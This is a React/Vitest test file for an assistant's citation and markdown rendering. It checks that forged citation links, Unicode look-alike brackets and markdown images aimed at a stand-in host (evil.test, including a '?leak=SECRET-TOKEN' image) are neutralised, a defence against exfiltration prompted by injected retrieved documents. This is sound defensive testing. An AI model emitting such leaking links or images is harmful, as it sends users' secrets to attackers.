import React from "react";
import { cleanup, render, screen } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";

// MarkdownText reads its message id from assistant-ui; give every render the turn "run-1".
vi.mock("@assistant-ui/react", async (importOriginal) => ({
  ...(await importOriginal<typeof import("@assistant-ui/react")>()),
  useAuiState: (selector: (state: { message: { id: string } }) => unknown) => selector({ message: { id: "run-1:assistant-1" } }),
}));

import { MarkdownText, ToolCallInfoContext } from "./messageParts";
import { citationHref, citationSourcesForRun, parseSources, type CitationSource } from "./citations";
import { toolCallInfos, type ToolCallInfo } from "./toolCalls";
import type { RunEvent } from "@/lib/runs";

afterEach(() => cleanup());

const SOURCES: CitationSource[] = [
  { n: 1, title: "Install guide", url: "https://docs.example.com/install#setup", kb_id: "kb1", document_key: "install.md" },
  { n: 2, title: "Billing", url: null, kb_id: "kb1", document_key: "billing faq.md" },
  { n: 3, title: "Bad scheme", url: "javascript:alert(1)", kb_id: "kb1", document_key: "x.md" },
];

function infos(entries: Array<[string, ToolCallInfo]>): Map<string, ToolCallInfo> {
  return new Map(entries);
}

function renderText(text: string, map: Map<string, ToolCallInfo> = infos([["run-1:call-1", { status: "ok", durationMs: 5, sources: SOURCES }]])) {
  return render(
    <ToolCallInfoContext.Provider value={map}>
      {/* MarkdownText is a text part; only `text` is used. */}
      <MarkdownText {...({ type: "text", text, status: { type: "complete" } } as unknown as React.ComponentProps<typeof MarkdownText>)} />
    </ToolCallInfoContext.Provider>,
  );
}

const links = () => screen.queryAllByTestId("citation-link");

describe("citations from the turn's retrieve sources", () => {
  it("[n] links to sources[n].url (new tab), a source without a URL to its document in Studio", () => {
    renderText("Install it first [1]. Billing is monthly [2].");
    const [first, second] = links();
    expect(first).toHaveAttribute("href", "https://docs.example.com/install#setup");
    expect(first).toHaveAttribute("target", "_blank");
    expect(first).toHaveAttribute("rel", expect.stringContaining("noopener"));
    expect(first).toHaveAccessibleName("Source 1: Install guide");
    expect(first).toHaveTextContent("[1]");
    expect(second).toHaveAttribute("href", "/knowledge/kb1?doc=billing+faq.md");
    expect(second).not.toHaveAttribute("target");
  });

  it("a source URL that is not http(s) is never linked: it falls back to the document in Studio", () => {
    renderText("See [3].");
    expect(links()[0]).toHaveAttribute("href", "/knowledge/kb1?doc=x.md");
    expect(document.querySelector('a[href^="javascript:"]')).toBeNull();
  });

  it("a number without a source stays plain text", () => {
    renderText("Unknown [7] here.");
    expect(links()).toHaveLength(0);
    expect(screen.getByText(/Unknown \[7\] here\./)).toBeInTheDocument();
  });

  it("forged citations in the model's text never keep the model's URL", () => {
    renderText("A [1] and B [2].\n\n[1]: https://evil.test/one\n[2]: https://evil.test/two");
    expect(links().map((a) => a.getAttribute("href"))).toEqual(["https://docs.example.com/install#setup", "/knowledge/kb1?doc=billing+faq.md"]);
    expect(document.querySelector('a[href*="evil"]')).toBeNull();
  });

  it("inline links shaped like citations are rewritten: [1](url), [[1]](url); one with no source becomes text", () => {
    renderText("X [1](https://evil.test) Y [[2]](https://evil.test) Z [[9]](https://evil.test)");
    expect(links().map((a) => a.getAttribute("href"))).toEqual(["https://docs.example.com/install#setup", "/knowledge/kb1?doc=billing+faq.md"]);
    expect(document.querySelector('a[href*="evil"]')).toBeNull();
    expect(screen.getByText(/\[9\]/)).toBeInTheDocument();
  });

  it("ordinary links and code are left alone", () => {
    renderText("Read [the docs](https://example.org) and run `curl [1]`.\n\n```\nitems[1]\n```");
    expect(screen.getByRole("link", { name: "the docs" })).toHaveAttribute("href", "https://example.org");
    expect(links()).toHaveLength(0);
    expect(screen.getByText("curl [1]")).toBeInTheDocument();
  });

  it("a turn without a retrieve call renders the text as before (model links kept, no citation links)", () => {
    renderText("Item [1](https://example.org/one) and [2].", infos([["run-1:call-1", { status: "ok", durationMs: 1 }]]));
    expect(links()).toHaveLength(0);
    expect(screen.getByRole("link", { name: "1" })).toHaveAttribute("href", "https://example.org/one");
  });

  it("another turn's sources are not used", () => {
    renderText("See [1].", infos([["run-2:call-1", { status: "ok", durationMs: 1, sources: SOURCES }]]));
    expect(links()).toHaveLength(0);
  });
});

describe("images in assistant text are never loaded (exfiltration through retrieved documents)", () => {
  const noImages = () => {
    expect(document.querySelector("img")).toBeNull();
    expect(document.querySelector('link[rel="preload"], link[as="image"]')).toBeNull();
    expect(document.documentElement.innerHTML).not.toContain("evil");
  };

  it("![](https://evil/?leak=…) renders nothing: no <img>, no preload link, the URL nowhere in the page", () => {
    renderText("Here you go ![](https://evil.test/?leak=SECRET-TOKEN) done.");
    noImages();
    expect(screen.queryByTestId("markdown-image-alt")).toBeNull();
    expect(screen.getByText(/Here you go/)).toHaveTextContent("Here you go done.");
  });

  it("an image with alt text shows only the alt text, in a turn without retrieve too; reference-style images as well", () => {
    renderText("A ![diagram of the flow](https://evil.test/p.png?d=1) and ![ref][img]\n\n[img]: https://evil.test/r.png", infos([]));
    noImages();
    expect(screen.getAllByTestId("markdown-image-alt").map((el) => el.textContent)).toEqual(["[image: diagram of the flow]", "[image: ref]"]);
  });

  it("an image inside a citation-looking link is still not loaded", () => {
    renderText("See [![1](https://evil.test/x.png)](https://evil.test/y)");
    noImages();
  });
});

describe("citation look-alikes never keep the model's URL", () => {
  const hrefs = () => links().map((a) => a.getAttribute("href"));

  it("a zero-width or other format character inside the brackets ([[1]\u200B](evil), [\u20601](evil))", () => {
    renderText("A [[1]\u200B](https://evil.test/a) B [\u20602\uFEFF](https://evil.test/b) C [\u00AD[1]](https://evil.test/c)");
    expect(hrefs()).toEqual(["https://docs.example.com/install#setup", "/knowledge/kb1?doc=billing+faq.md", "https://docs.example.com/install#setup"]);
    expect(document.querySelector('a[href*="evil"]')).toBeNull();
  });

  it("fullwidth digits and brackets ([[１]](evil), [［２］](evil)) are normalised (NFKC)", () => {
    renderText("A [[１]](https://evil.test/a) B [［２］](https://evil.test/b)");
    expect(hrefs()).toEqual(["https://docs.example.com/install#setup", "/knowledge/kb1?doc=billing+faq.md"]);
    expect(document.querySelector('a[href*="evil"]')).toBeNull();
  });

  it("(n) is treated as [n]: [(1)](evil), [ ( 2 ) ](evil)", () => {
    renderText("A [(1)](https://evil.test/a) B [ ( 2 ) ](https://evil.test/b)");
    expect(hrefs()).toEqual(["https://docs.example.com/install#setup", "/knowledge/kb1?doc=billing+faq.md"]);
  });

  it("a look-alike whose number has no source becomes plain [n] text, not the model's link", () => {
    renderText("A [[８]\u200B](https://evil.test/a) B [(9)](https://evil.test/b)");
    expect(links()).toHaveLength(0);
    expect(document.querySelector('a[href*="evil"]')).toBeNull();
    expect(screen.getByText(/A \[8\] B \[9\]/)).toBeInTheDocument();
  });

  it("U+FE0F, U+034F and combining marks inside the brackets are invisible: [1\uFE0F](evil), [\u034F2](evil), [1\u0301](evil)", () => {
    renderText("A [1\uFE0F](https://evil.test/a) B [\u034F2](https://evil.test/b) C [1\u0301](https://evil.test/c)");
    expect(hrefs()).toEqual(["https://docs.example.com/install#setup", "/knowledge/kb1?doc=billing+faq.md", "https://docs.example.com/install#setup"]);
    expect(document.querySelector('a[href*="evil"]')).toBeNull();
  });

  it("tag characters (U+E0000–E007F, even tag letters) are invisible: [1 + TAG LATIN A..](evil)", () => {
    renderText("A [1\u{E0061}\u{E0062}\u{E007F}](https://evil.test/a) B [\u{E0001}2](https://evil.test/b)");
    expect(hrefs()).toEqual(["https://docs.example.com/install#setup", "/knowledge/kb1?doc=billing+faq.md"]);
    expect(document.querySelector('a[href*="evil"]')).toBeNull();
  });

  it("visible bracket and digit variants are citations too: 【1】, [١] (Arabic-Indic), [२] (Devanagari)", () => {
    renderText("A [【1】](https://evil.test/a) B [[١]](https://evil.test/b) C [२](https://evil.test/c)");
    expect(hrefs()).toEqual(["https://docs.example.com/install#setup", "https://docs.example.com/install#setup", "/knowledge/kb1?doc=billing+faq.md"]);
    expect(document.querySelector('a[href*="evil"]')).toBeNull();
  });

  it("any letterless model link loses its URL: [1, 2](evil) links both sources; [→](evil) and [⁂](evil) become plain text", () => {
    renderText("A [1, 2](https://evil.test/a) B [→](https://evil.test/b) C [⁂](https://evil.test/c) D [1234](https://evil.test/d)");
    expect(hrefs()).toEqual(["https://docs.example.com/install#setup", "/knowledge/kb1?doc=billing+faq.md"]);
    expect(document.querySelector('a[href*="evil"]')).toBeNull();
    expect(screen.getByText(/B → C ⁂ D 1234/)).toBeInTheDocument();
  });

  it("text links that merely contain a number are ordinary links", () => {
    renderText("Read [step 1](https://example.org/s1) and [1 of 3](https://example.org/p).");
    expect(screen.getByRole("link", { name: "step 1" })).toHaveAttribute("href", "https://example.org/s1");
    expect(screen.getByRole("link", { name: "1 of 3" })).toHaveAttribute("href", "https://example.org/p");
  });
});

describe("source extraction", () => {
  const event = (seq: number, type: string, data: Record<string, unknown>): RunEvent => ({ seq, type: type as RunEvent["type"], data, ts: `2026-11-14T10:00:0${seq}Z` });

  it("toolCallInfos keeps sources for retrieve results only ([] when none came back)", () => {
    const map = toolCallInfos(
      [
        event(1, "tool_call", { tool_call_id: "c1", tool_name: "retrieve" }),
        event(2, "tool_result", { tool_call_id: "c1", tool_name: "retrieve", status: "ok", content: "...", sources: [{ n: 1, title: "A", url: "https://a.test" }] }),
        event(3, "tool_call", { tool_call_id: "c2", tool_name: "http.get" }),
        event(4, "tool_result", { tool_call_id: "c2", tool_name: "http.get", status: "ok", content: "x", sources: [{ n: 1, title: "forged", url: "https://evil.test" }] }),
        event(5, "tool_call", { tool_call_id: "c3", tool_name: "retrieve" }),
        event(6, "tool_result", { tool_call_id: "c3", tool_name: "retrieve", status: "ok", content: "No results" }),
      ],
      false,
    );
    expect(map.get("c1")?.sources).toEqual([{ n: 1, title: "A", url: "https://a.test" }]);
    expect(map.get("c2")).not.toHaveProperty("sources");
    expect(map.get("c3")?.sources).toEqual([]);
    expect(map.get("c1")).toMatchObject({ status: "ok", durationMs: 1000 });
  });

  it("parseSources drops malformed entries", () => {
    expect(parseSources([{ n: 1, title: "A", url: "https://a.test", score: 0.5 }, { n: "2" }, null, { n: 0 }, { n: 3 }])).toEqual([
      { n: 1, title: "A", url: "https://a.test", score: 0.5 },
      { n: 3, title: "Source 3", url: null },
    ]);
    expect(parseSources("nope")).toEqual([]);
  });

  it("citationSourcesForRun: null without a retrieve call; else the last retrieve call that returned sources", () => {
    expect(citationSourcesForRun(infos([["r:c1", { status: "ok", durationMs: 1 }]]), "r")).toBeNull();
    const map = citationSourcesForRun(
      infos([
        ["r:c1", { status: "ok", durationMs: 1, sources: [{ n: 1, title: "old", url: null }, { n: 2, title: "old 2", url: null }] }],
        ["r:c2", { status: "ok", durationMs: 1, sources: [{ n: 1, title: "new", url: null }] }],
        ["r:c3", { status: "ok", durationMs: 1, sources: [] }],
        ["other:c9", { status: "ok", durationMs: 1, sources: [{ n: 5, title: "x", url: null }] }],
      ]),
      "r",
    );
    expect([...map!.entries()].map(([n, s]) => [n, s.title])).toEqual([[1, "new"]]);
  });

  it("citationHref: http(s) URL, else the Studio document, else null", () => {
    expect(citationHref({ n: 1, title: "a", url: "https://a.test" })).toBe("https://a.test");
    expect(citationHref({ n: 1, title: "a", url: "ftp://a.test", kb_id: "k", document_key: "d" })).toBe("/knowledge/k?doc=d");
    expect(citationHref({ n: 1, title: "a", url: null })).toBeNull();
  });
});

describe("the letterless-link rule applies whenever the turn called retrieve (browser check, item 9)", () => {
  const ev = (seq: number, type: RunEvent["type"], data: object): RunEvent => ({ seq, type, data: data as RunEvent["data"], ts: `2026-11-14T10:00:0${seq}Z` });

  for (const [name, events, running] of [
    ["still running (no tool_result yet)", [ev(1, "tool_call", { tool_call_id: "r", tool_name: "retrieve", args: {} })], true],
    ["ended without a result", [ev(1, "tool_call", { tool_call_id: "r", tool_name: "retrieve", args: {} })], false],
    ["announced in a model message only", [ev(1, "model_message", { model_request: 0, tool_calls: [{ tool_call_id: "r", tool_name: "retrieve", args: {} }] })], true],
    ["failed (error result without a tool name)", [ev(1, "tool_call", { tool_call_id: "r", tool_name: "retrieve", args: {} }), ev(2, "tool_result", { tool_call_id: "r", status: "error" })], false],
  ] as const) {
    it(`a retrieve call ${name}: [2](https://evil…) is plain text, not the model's link`, () => {
      const infosOfTurn = new Map([...toolCallInfos(events as unknown as RunEvent[], running)].map(([id, info]) => [`run-1:${id}`, info]));
      expect(citationSourcesForRun(infosOfTurn, "run-1")).toEqual(new Map());
      renderText("Per the docs [2](https://evil.test/x).", infosOfTurn);
      expect(document.querySelector('a[href*="evil"]')).toBeNull();
      expect(screen.getByText(/\[2\]/)).toBeInTheDocument();
    });
  }

  it("a turn that did not call retrieve keeps an ordinary nofollow link (accepted)", () => {
    const infosOfTurn = new Map([...toolCallInfos([ev(1, "tool_call", { tool_call_id: "x", tool_name: "http_get", args: {} })], false)].map(([id, info]) => [`run-1:${id}`, info]));
    expect(citationSourcesForRun(infosOfTurn, "run-1")).toBeNull();
    renderText("See [2](https://evil.test/x).", infosOfTurn);
    const link = document.querySelector('a[href*="evil"]');
    expect(link).not.toBeNull();
    expect(link).toHaveAttribute("rel", expect.stringContaining("nofollow"));
    expect(links()).toHaveLength(0);
  });
});

describe("several retrieve calls in one turn: run-wide numbers (milestone browser check, item 1)", () => {
  const ev = (seq: number, type: RunEvent["type"], data: object): RunEvent => ({ seq, type, data: data as RunEvent["data"], ts: `2026-11-14T10:00:0${seq}Z` });
  const src = (n: number, title: string, url: string, numbering: "run" | null = "run") => ({
    n, ...(numbering ? { numbering } : {}), title, url, kb_id: "kb1", document_key: `${title.toLowerCase()}.md`,
  });
  /** The repro: two parallel retrieve calls (refunds; API limits); the worker numbers the second call's sources after the first's. */
  const turn = (sourcesA: object[], sourcesB: object[]) =>
    new Map(
      [
        ...toolCallInfos(
          [
            ev(1, "tool_call", { tool_call_id: "a", tool_name: "retrieve", args: { search_query: "refunds" } }),
            ev(2, "tool_call", { tool_call_id: "b", tool_name: "retrieve", args: { search_query: "pro plan API calls per day" } }),
            ev(3, "tool_result", { tool_call_id: "a", tool_name: "retrieve", status: "ok", content: "…", sources: sourcesA }),
            ev(4, "tool_result", { tool_call_id: "b", tool_name: "retrieve", status: "ok", content: "…", sources: sourcesB }),
          ],
          false,
        ),
      ].map(([id, info]) => [`run-1:${id}`, info]),
    );

  it("each [n] links to the source the model read under that number, across both calls", () => {
    const infosOfTurn = turn(
      [src(1, "Refunds", "https://docs.test/billing#refunds"), src(2, "Refund policy", "https://docs.test/policy#refunds"),
        src(3, "Invoices", "https://docs.test/billing#invoices"), src(4, "Cards", "https://docs.test/billing#cards")],
      [src(5, "API limits", "https://docs.test/plans#api-limits"), src(6, "Pro plan", "https://docs.test/plans#pro")],
    );
    renderText("Refunds take five days [1][2]. The pro plan allows 10,000 calls per day [5].", infosOfTurn);
    const byN = Object.fromEntries(links().map((a) => [a.getAttribute("data-citation"), a.getAttribute("href")]));
    expect(byN).toEqual({
      "1": "https://docs.test/billing#refunds",
      "2": "https://docs.test/policy#refunds",
      "5": "https://docs.test/plans#api-limits",
    });
    expect(screen.getAllByTestId("citation-link").find((a) => a.getAttribute("data-citation") === "5")).toHaveAccessibleName("Source 5: API limits");
  });

  it("citationSourcesForRun: the union of every call's run-numbered sources, in turn order", () => {
    const map = citationSourcesForRun(turn([src(1, "A", "https://a.test"), src(2, "B", "https://b.test")], [src(3, "C", "https://c.test")]), "run-1");
    expect([...map!.entries()].map(([n, s]) => [n, s.title])).toEqual([[1, "A"], [2, "B"], [3, "C"]]);
    // A call that returned nothing does not hide the others.
    const withEmpty = citationSourcesForRun(turn([src(1, "A", "https://a.test")], []), "run-1");
    expect([...withEmpty!.keys()]).toEqual([1]);
  });

  it("old runs (sources without numbering, each call from [1]) keep the last call's sources", () => {
    const infosOfTurn = turn(
      [src(1, "Refunds", "https://docs.test/billing#refunds", null), src(2, "Invoices", "https://docs.test/billing#invoices", null)],
      [src(1, "API limits", "https://docs.test/plans#api-limits", null)],
    );
    expect([...citationSourcesForRun(infosOfTurn, "run-1")!.entries()].map(([n, s]) => [n, s.title])).toEqual([[1, "API limits"]]);
    renderText("Limits [1], refunds [2].", infosOfTurn);
    expect(links().map((a) => a.getAttribute("href"))).toEqual(["https://docs.test/plans#api-limits"]);
    expect(screen.getByText(/refunds \[2\]/)).toBeInTheDocument(); // no source [2] in the last call: plain text
  });

  it("parseSources keeps numbering only when it is \"run\"", () => {
    expect(parseSources([{ n: 4, numbering: "run", title: "A", url: null }, { n: 1, numbering: "call", title: "B", url: null }])).toEqual([
      { n: 4, numbering: "run", title: "A", url: null },
      { n: 1, title: "B", url: null },
    ]);
  });
});
